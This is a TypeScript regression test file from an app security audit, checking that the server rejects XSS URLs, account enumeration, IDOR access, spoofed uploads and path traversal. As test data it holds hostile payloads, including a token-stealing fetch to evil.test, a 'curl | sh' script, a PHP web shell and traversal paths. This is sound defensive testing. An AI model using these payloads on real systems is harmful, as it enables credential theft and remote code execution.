import request from 'supertest';
import path from 'path';
import fs from 'fs';
import { app } from '../index';
import { prisma } from '../db';
import { UPLOAD_DIR } from '../upload';

/**
 * Regression tests for the security audit.
 *
 * Every test here corresponds to a specific finding: it fails against the pre-audit code
 * and passes after the fix. Grouped by the vulnerability class rather than by route, so a
 * future reader can see at a glance which classes are actually covered by tests and which
 * are only covered by review.
 */

async function signup(handle: string, overrides: Record<string, unknown> = {}) {
  const res = await request(app)
    .post('/auth/signup')
    .send({
      email: `${handle}@sectest.com`,
      password: 'password123',
      name: `${handle} Inc`,
      handle,
      category: 'Testing',
      city: 'Sectown',
      isRestaurant: true,
      cuisineSlug: 'other',
      ...overrides,
    });
  return res.body as { token: string; business: { id: string } };
}

async function createPost(token: string, fields: Record<string, string> = {}) {
  let req = request(app)
    .post('/posts')
    .set('Authorization', `Bearer ${token}`)
    .field('caption', fields.caption ?? 'security test caption')
    .field('tag', fields.tag ?? 'Culture');
  if (fields.status) req = req.field('status', fields.status);
  if (fields.scheduledFor) req = req.field('scheduledFor', fields.scheduledFor);
  return req.attach('media', path.join(__dirname, 'fixtures', 'sample.png'));
}

describe('Security: URL scheme validation (stored-XSS class)', () => {
  // `z.string().url()` accepts every one of these — they are all syntactically valid URLs.
  // The danger is that the stored value is later handed to Linking.openURL / an anchor href.
  const DANGEROUS = [
    'javascript:alert(document.domain)',
    "javascript:fetch('https://evil.test/?t='+localStorage.token)",
    'JavaScript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
  ];

  it.each(DANGEROUS)('rejects %s as a website', async (url) => {
    const biz = await signup('xssbiz' + Math.random().toString(36).slice(2, 8));
    const res = await request(app)
      .patch('/businesses/me')
      .set('Authorization', `Bearer ${biz.token}`)
      .send({ website: url });

    expect(res.status).toBe(400);
  });

  it('still accepts ordinary http and https links', async () => {
    const biz = await signup('okbiz');
    for (const url of ['https://example.com/order', 'http://example.com']) {
      const res = await request(app)
        .patch('/businesses/me')
        .set('Authorization', `Bearer ${biz.token}`)
        .send({ website: url });
      expect(res.status).toBe(200);
      expect(res.body.business.website).toBe(url);
    }
  });

  it('allows clearing the website with an empty string', async () => {
    const biz = await signup('clearbiz');
    await request(app)
      .patch('/businesses/me')
      .set('Authorization', `Bearer ${biz.token}`)
      .send({ website: 'https://example.com' });

    const res = await request(app)
      .patch('/businesses/me')
      .set('Authorization', `Bearer ${biz.token}`)
      .send({ website: '' });
    expect(res.status).toBe(200);
    expect(res.body.business.website).toBeNull();
  });

  it('never serves a dangerous URL that is already in the database', async () => {
    // Simulates a row written before the validation existed, by writing straight past the
    // API to the database — this is what the read-path filter in serializeBusiness is for.
    const biz = await signup('legacybiz');
    await prisma.business.update({
      where: { id: biz.business.id },
      data: { website: 'javascript:alert(1)' },
    });

    const res = await request(app).get(`/businesses/${biz.business.id}`);
    expect(res.status).toBe(200);
    expect(res.body.business.website).toBeNull();
  });
});

describe('Security: account enumeration', () => {
  it('returns an identical error for an unknown email and a wrong password', async () => {
    await signup('enumreal');

    const wrongPassword = await request(app)
      .post('/auth/login')
      .send({ email: 'enumreal@sectest.com', password: 'not-the-password' });
    const unknownEmail = await request(app)
      .post('/auth/login')
      .send({ email: 'enum-nobody@sectest.com', password: 'not-the-password' });

    expect(wrongPassword.status).toBe(401);
    expect(unknownEmail.status).toBe(401);
    expect(unknownEmail.body).toEqual(wrongPassword.body);
  });

  it('takes comparable time for an unknown email and a wrong password', async () => {
    // Before the fix the unknown-email path skipped bcrypt entirely and answered ~21x
    // faster, which reveals whether an email has an account just as plainly as a different
    // error message would. Threshold is deliberately loose (real gap was 20.9x, now ~1.1x)
    // so this asserts "bcrypt actually runs on both paths" without being a flaky benchmark.
    await signup('enumtiming');

    const median = async (email: string) => {
      const samples: number[] = [];
      for (let i = 0; i < 7; i++) {
        const t = process.hrtime.bigint();
        await request(app).post('/auth/login').send({ email, password: 'not-the-password' });
        samples.push(Number(process.hrtime.bigint() - t) / 1e6);
      }
      return samples.sort((a, b) => a - b)[Math.floor(samples.length / 2)];
    };

    const known = await median('enumtiming@sectest.com');
    const unknown = await median('enum-nobody-2@sectest.com');

    // Asserted as an absolute floor rather than a known/unknown ratio. The ratio version
    // flaked once under full-suite load: both numbers inflate together when the machine is
    // busy, but not evenly, so the ratio moves around even though the behaviour is correct.
    // The property that actually matters is "bcrypt ran on the unknown-email path too", and
    // bcrypt at cost 10 cannot complete in single-digit milliseconds — the pre-fix path
    // measured ~4ms, the fixed path ~90ms. A 25ms floor sits far from both.
    expect(unknown).toBeGreaterThan(25);
    expect(known).toBeGreaterThan(25);
  }, 60000);

  it('does not reveal through forgot-password whether an email exists', async () => {
    await signup('enumforgot');
    const known = await request(app).post('/auth/forgot-password').send({ email: 'enumforgot@sectest.com' });
    const unknown = await request(app).post('/auth/forgot-password').send({ email: 'enum-nobody-3@sectest.com' });

    expect(known.status).toBe(200);
    expect(unknown.status).toBe(200);
    expect(unknown.body).toEqual(known.body);
  });
});

describe('Security: access control (IDOR class)', () => {
  it('will not let one account edit another account\'s post', async () => {
    const owner = await signup('idorowner1');
    const attacker = await signup('idoratk1');
    const post = await createPost(owner.token);

    const res = await request(app)
      .patch(`/posts/${post.body.post.id}`)
      .set('Authorization', `Bearer ${attacker.token}`)
      .send({ caption: 'defaced' });

    expect(res.status).toBe(404);
    const after = await prisma.post.findUnique({ where: { id: post.body.post.id } });
    expect(after?.caption).toBe('security test caption');
  });

  it('will not let one account delete another account\'s post', async () => {
    const owner = await signup('idorowner2');
    const attacker = await signup('idoratk2');
    const post = await createPost(owner.token);

    const res = await request(app)
      .delete(`/posts/${post.body.post.id}`)
      .set('Authorization', `Bearer ${attacker.token}`);

    expect(res.status).toBe(404);
    expect(await prisma.post.findUnique({ where: { id: post.body.post.id } })).not.toBeNull();
  });

  it('will not let a stranger delete a comment they did not write', async () => {
    const owner = await signup('idorowner3');
    const commenter = await signup('idorcmt3');
    const attacker = await signup('idoratk3');
    const post = await createPost(owner.token);
    const comment = await request(app)
      .post(`/posts/${post.body.post.id}/comments`)
      .set('Authorization', `Bearer ${commenter.token}`)
      .send({ text: 'nice' });

    const res = await request(app)
      .delete(`/posts/${post.body.post.id}/comments/${comment.body.comment.id}`)
      .set('Authorization', `Bearer ${attacker.token}`);

    expect(res.status).toBe(403);
    expect(await prisma.comment.findUnique({ where: { id: comment.body.comment.id } })).not.toBeNull();
  });

  it('will not let a non-owner mark a question answered', async () => {
    const owner = await signup('idorowner4');
    const asker = await signup('idorask4');
    const post = await createPost(owner.token);
    const comment = await request(app)
      .post(`/posts/${post.body.post.id}/comments`)
      .set('Authorization', `Bearer ${asker.token}`)
      .send({ text: 'open mondays?', isReply: true });

    const res = await request(app)
      .post(`/posts/${post.body.post.id}/comments/${comment.body.comment.id}/answered`)
      .set('Authorization', `Bearer ${asker.token}`);

    expect(res.status).toBe(403);
  });

  it("will not expose another restaurant's promo code stats", async () => {
    const owner = await signup('idorowner5');
    const attacker = await signup('idoratk5');
    await request(app)
      .post('/promo-codes')
      .set('Authorization', `Bearer ${owner.token}`)
      .send({ code: 'SECRET5', discountDescription: '10% off' });

    const res = await request(app)
      .get('/promo-codes/SECRET5/stats')
      .set('Authorization', `Bearer ${attacker.token}`);

    expect(res.status).toBe(403);
    expect(res.body.redemptionCount).toBeUndefined();
  });

  it('scopes link-click stats to the calling account only', async () => {
    const a = await signup('idorclicka');
    const b = await signup('idorclickb');
    await request(app).post(`/businesses/${a.business.id}/link-click`).send({});
    await request(app).post(`/businesses/${a.business.id}/link-click`).send({});

    const mine = await request(app)
      .get('/businesses/me/link-clicks')
      .set('Authorization', `Bearer ${b.token}`);

    expect(mine.status).toBe(200);
    expect(mine.body.totalClicks).toBe(0);
  });

  it("will not let one account read another's notifications or mark them read", async () => {
    const owner = await signup('idorowner6');
    const attacker = await signup('idoratk6');
    const liker = await signup('idorlike6');
    const post = await createPost(owner.token);
    await request(app).post(`/posts/${post.body.post.id}/like`).set('Authorization', `Bearer ${liker.token}`);

    const notif = await prisma.notification.findFirst({ where: { recipientId: owner.business.id } });
    expect(notif).not.toBeNull();

    const res = await request(app)
      .post(`/notifications/${notif!.id}/read`)
      .set('Authorization', `Bearer ${attacker.token}`);

    expect(res.status).toBe(404);
    expect((await prisma.notification.findUnique({ where: { id: notif!.id } }))?.read).toBe(false);
  });

  it('will not let a non-participant read a private thread', async () => {
    const a = await signup('idorthreada');
    const b = await signup('idorthreadb');
    const attacker = await signup('idorthreadx');
    const thread = await request(app)
      .post('/threads')
      .set('Authorization', `Bearer ${a.token}`)
      .send({ businessId: b.business.id });
    await request(app)
      .post(`/threads/${thread.body.threadId}/messages`)
      .set('Authorization', `Bearer ${a.token}`)
      .send({ text: 'private business talk' });

    const res = await request(app)
      .get(`/threads/${thread.body.threadId}/messages`)
      .set('Authorization', `Bearer ${attacker.token}`);

    expect(res.status).toBe(404);
    expect(res.body.messages).toBeUndefined();
  });

  it('will not let one owner remove another business\'s team member', async () => {
    const owner = await signup('idorteama');
    const attacker = await signup('idorteamb');
    const member = await request(app)
      .post('/team')
      .set('Authorization', `Bearer ${owner.token}`)
      .send({ email: 'teammate-idor@sectest.com', password: 'password123' });

    const res = await request(app)
      .delete(`/team/${member.body.member.id}`)
      .set('Authorization', `Bearer ${attacker.token}`);

    expect(res.status).toBe(404);
    expect(await prisma.businessMember.findUnique({ where: { id: member.body.member.id } })).not.toBeNull();
  });

  it('rejects moderation endpoints for a non-admin account', async () => {
    const attacker = await signup('idormod');
    const res = await request(app)
      .get('/moderation/reports')
      .set('Authorization', `Bearer ${attacker.token}`);
    expect(res.status).toBe(403);
  });
});

describe('Security: file upload content verification', () => {
  // The mimetype multer's fileFilter checks is the one the CLIENT declares in the multipart
  // part header, so every payload below sails past that filter. These tests attach real
  // non-media bytes while claiming an allowed image type — the exact spoof the header check
  // alone could not catch.
  const SPOOFS: [string, string, string][] = [
    ['an HTML document', '<html><script>alert(document.domain)</script></html>', 'payload.png'],
    ['an SVG', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'payload.png'],
    ['a shell script', '#!/bin/sh\ncurl https://evil.test | sh\n', 'payload.jpg'],
    ['PHP source', '<?php system($_GET["c"]); ?>', 'payload.jpg'],
  ];

  it.each(SPOOFS)('rejects %s uploaded with a spoofed image Content-Type', async (_label, body, filename) => {
    const biz = await signup('spoof' + Math.random().toString(36).slice(2, 8));
    const res = await request(app)
      .post('/posts')
      .set('Authorization', `Bearer ${biz.token}`)
      .field('caption', 'spoofed upload')
      .field('tag', 'Culture')
      .attach('media', Buffer.from(body), { filename, contentType: 'image/png' });

    expect(res.status).toBe(400);
    expect(await prisma.post.count({ where: { businessId: biz.business.id } })).toBe(0);
  });

  it('does not leave a rejected upload behind on disk', async () => {
    const biz = await signup('spoofdisk');
    const before = fs.readdirSync(UPLOAD_DIR).length;
    await request(app)
      .post('/posts')
      .set('Authorization', `Bearer ${biz.token}`)
      .field('caption', 'spoofed upload')
      .field('tag', 'Culture')
      .attach('media', Buffer.from('<html>not an image</html>'), {
        filename: 'x.png',
        contentType: 'image/png',
      });

    expect(fs.readdirSync(UPLOAD_DIR).length).toBe(before);
  });

  it('rejects a spoofed avatar upload too', async () => {
    const biz = await signup('spoofavatar');
    const res = await request(app)
      .post('/businesses/me/avatar')
      .set('Authorization', `Bearer ${biz.token}`)
      .attach('media', Buffer.from('<html>nope</html>'), { filename: 'a.png', contentType: 'image/png' });

    expect(res.status).toBe(400);
  });

  it('still accepts a genuine image', async () => {
    const biz = await signup('genuineimg');
    const res = await createPost(biz.token);
    expect(res.status).toBe(201);
  });

  it('ignores a traversal-style filename instead of writing outside the upload dir', async () => {
    const biz = await signup('traversal');
    const res = await request(app)
      .post('/posts')
      .set('Authorization', `Bearer ${biz.token}`)
      .field('caption', 'traversal attempt')
      .field('tag', 'Culture')
      .attach('media', path.join(__dirname, 'fixtures', 'sample.png'), {
        filename: '../../../../etc/cron.d/pwned.png',
        contentType: 'image/png',
      });

    expect(res.status).toBe(201);
    // The stored name is server-generated (randomUUID + an extension from the mimetype
    // allowlist), so nothing the client sent can steer the path or the type.
    const storedUrl: string = res.body.post.mediaUrl;
    expect(storedUrl).not.toContain('..');
    expect(storedUrl).not.toContain('cron.d');
    expect(storedUrl).toMatch(/^\/uploads\/[0-9a-f-]{36}\.png$/);
  });

  it('serves uploads without allowing traversal out of the upload directory', async () => {
    for (const attempt of [
      '/uploads/../package.json',
      '/uploads/..%2f..%2fpackage.json',
      '/uploads/....//package.json',
    ]) {
      const res = await request(app).get(attempt);
      expect(res.status).not.toBe(200);
    }
  });
});

describe('Security: shared guest account', () => {
  // "Continue as guest" hands every visitor a token for ONE shared row. That is fine for
  // browsing, but it also made every visitor the *owner* of that row (a guest token carries
  // mid: null, so requireOwner passes), which meant any stranger held account-management
  // rights over an account holding other strangers' activity.
  async function guestToken() {
    const res = await request(app).post('/auth/guest').send({});
    return res.body.token as string;
  }

  it('confirms all guests really do share one account', async () => {
    const a = await request(app).post('/auth/guest').send({});
    const b = await request(app).post('/auth/guest').send({});
    expect(a.body.business.id).toBe(b.body.business.id);
  });

  it('will not let a guest deface the shared profile', async () => {
    const res = await request(app)
      .patch('/businesses/me')
      .set('Authorization', `Bearer ${await guestToken()}`)
      .send({ name: 'Renamed By A Stranger', bio: 'defaced' });
    expect(res.status).toBe(403);
  });

  it("will not let a guest export the shared account's data, including private messages", async () => {
    const res = await request(app)
      .get('/businesses/me/export')
      .set('Authorization', `Bearer ${await guestToken()}`);
    expect(res.status).toBe(403);
    expect(res.body.threads).toBeUndefined();
  });

  it('will not let a guest delete the shared account', async () => {
    const res = await request(app)
      .delete('/businesses/me')
      .set('Authorization', `Bearer ${await guestToken()}`);
    expect(res.status).toBe(403);
    expect(await prisma.business.findUnique({ where: { email: 'guest@verve.demo' } })).not.toBeNull();
  });

  it('will not let a guest invite team members or create promo codes', async () => {
    const token = await guestToken();
    const invite = await request(app)
      .post('/team')
      .set('Authorization', `Bearer ${token}`)
      .send({ email: 'guest-invite@sectest.com', password: 'password123' });
    const promo = await request(app)
      .post('/promo-codes')
      .set('Authorization', `Bearer ${token}`)
      .send({ code: 'GUESTCODE', discountDescription: 'free stuff' });

    expect(invite.status).toBe(403);
    expect(promo.status).toBe(403);
  });

  it('still lets a guest browse, which is the whole point of the mode', async () => {
    const res = await request(app).get('/auth/me').set('Authorization', `Bearer ${await guestToken()}`);
    expect(res.status).toBe(200);
  });

  it('does not restrict a normal signed-up account', async () => {
    const biz = await signup('notaguest');
    const res = await request(app)
      .patch('/businesses/me')
      .set('Authorization', `Bearer ${biz.token}`)
      .send({ bio: 'a normal account can still edit itself' });
    expect(res.status).toBe(200);
  });
});

describe('Security: restaurant-only posting', () => {
  // Nibbler is restaurant-only for publishing. The compose button is hidden for viewers in
  // the app, but that is presentation — the endpoint accepted a viewer's token and created
  // the row (verified before the fix: HTTP 201 with a persisted Post).
  it('rejects a post from a viewer account with 403 and creates nothing', async () => {
    const viewer = await signup('postviewer', { isRestaurant: false, category: 'Just browsing', cuisineSlug: undefined });

    const res = await request(app)
      .post('/posts')
      .set('Authorization', `Bearer ${viewer.token}`)
      .field('caption', 'a viewer should not be able to post this')
      .field('tag', 'Culture')
      .attach('media', path.join(__dirname, 'fixtures', 'sample.png'));

    expect(res.status).toBe(403);
    expect(res.body.error).toMatch(/restaurant/i);
    expect(await prisma.post.count({ where: { businessId: viewer.business.id } })).toBe(0);
  });

  it('still lets a restaurant account post normally', async () => {
    const chef = await signup('postchef');
    const res = await request(app)
      .post('/posts')
      .set('Authorization', `Bearer ${chef.token}`)
      .field('caption', 'a restaurant can still post')
      .field('tag', 'Culture')
      .attach('media', path.join(__dirname, 'fixtures', 'sample.png'));

    expect(res.status).toBe(201);
    expect(await prisma.post.count({ where: { businessId: chef.business.id } })).toBe(1);
  });

  it('rejects the guest account too, since the shared guest is not a restaurant', async () => {
    const guest = await request(app).post('/auth/guest').send({});
    const res = await request(app)
      .post('/posts')
      .set('Authorization', `Bearer ${guest.body.token}`)
      .field('caption', 'guest post attempt')
      .field('tag', 'Culture')
      .attach('media', path.join(__dirname, 'fixtures', 'sample.png'));

    expect(res.status).toBe(403);
  });

  it('does not leave the rejected upload on disk', async () => {
    const viewer = await signup('postviewerdisk', { isRestaurant: false, category: 'Just browsing', cuisineSlug: undefined });
    const before = fs.readdirSync(UPLOAD_DIR).length;

    await request(app)
      .post('/posts')
      .set('Authorization', `Bearer ${viewer.token}`)
      .field('caption', 'rejected before multer writes anything')
      .field('tag', 'Culture')
      .attach('media', path.join(__dirname, 'fixtures', 'sample.png'));

    // The guard runs before the upload middleware, so nothing should have been written.
    expect(fs.readdirSync(UPLOAD_DIR).length).toBe(before);
  });
});

describe('Security: unpublished content disclosure', () => {
  it('does not serve another account\'s draft post by id', async () => {
    const owner = await signup('draftowner');
    const stranger = await signup('draftstranger');
    const draft = await createPost(owner.token, { status: 'draft', caption: 'unannounced menu' });
    const draftId = draft.body.post.id;

    const anon = await request(app).get(`/posts/${draftId}`);
    expect(anon.status).toBe(404);

    const other = await request(app).get(`/posts/${draftId}`).set('Authorization', `Bearer ${stranger.token}`);
    expect(other.status).toBe(404);
  });

  it('does not serve a not-yet-due scheduled post by id', async () => {
    const owner = await signup('schedowner');
    const stranger = await signup('schedstranger');
    const future = new Date(Date.now() + 60 * 60 * 1000).toISOString();
    const post = await createPost(owner.token, { status: 'scheduled', scheduledFor: future, caption: 'embargoed' });

    const res = await request(app)
      .get(`/posts/${post.body.post.id}`)
      .set('Authorization', `Bearer ${stranger.token}`);
    expect(res.status).toBe(404);
  });

  it('still lets the owner open their own draft', async () => {
    const owner = await signup('draftself');
    const draft = await createPost(owner.token, { status: 'draft', caption: 'my own draft' });

    const res = await request(app)
      .get(`/posts/${draft.body.post.id}`)
      .set('Authorization', `Bearer ${owner.token}`);
    expect(res.status).toBe(200);
    expect(res.body.post.caption).toBe('my own draft');
  });

  it('still serves an ordinary published post to anyone', async () => {
    const owner = await signup('pubowner');
    const post = await createPost(owner.token, { caption: 'live post' });
    const res = await request(app).get(`/posts/${post.body.post.id}`);
    expect(res.status).toBe(200);
  });
});
